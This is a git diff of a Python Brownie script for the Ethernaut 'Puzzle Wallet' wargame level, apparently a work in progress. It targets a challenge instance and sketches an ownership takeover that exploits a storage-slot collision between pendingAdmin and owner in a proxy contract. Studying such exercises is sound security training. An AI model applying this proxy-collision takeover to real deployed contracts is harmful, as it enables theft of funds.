@@ -3,7 +3,7 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24, PuzzleWallet, PuzzleProxy, Contract
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0xC0f70e469aA5E310d6566A11ECF4134998Fc1201"
+ETHERNAUT_INSTANCE = "0xDad6848030a5EA9fAd321976cc63FCef8b709907"
 GAS_LIMIT = 12000000
 
 def contract_total_balance():
@@ -61,18 +61,20 @@ def main():
     player = get_account()
     print(f"\nplayer address = {player}")
     target = interface.IPuzzleWallet(ETHERNAUT_INSTANCE)
-
     proxy = Contract.from_abi(PuzzleProxy._name, ETHERNAUT_INSTANCE, PuzzleProxy.abi)
     print(f"PuzzleProxy.admin() = {proxy.admin()}")
+    # print(f"\n {PuzzleWallet.abi}")
+
     print_status()
 
+    target.addToWhitelist(player, {"from": player})
+    print_status()
 
-    # attack = Attack24.deploy({"from": player})
-   
-    # contract_total_balance()
-    # print_status()
     # target.proposeNewAdmin(player, {"from": player})   
     # print_status()
+
+    # Solidity attack here ??
+
     # proxy.addToWhiteList(player, {"from": player})
     # print_status()
 
@@ -82,7 +84,8 @@ def main():
 
     storage slot 0 has a collision - pendingAdmin and owner share the same slot
 
-    1. set pendingAdmin to player address
+    1. set pendingAdmin to player address by calling proposeNewAdmin(player)
+            --> this leap frog's having to call init()
 
     2. now: owner == address(player)
 
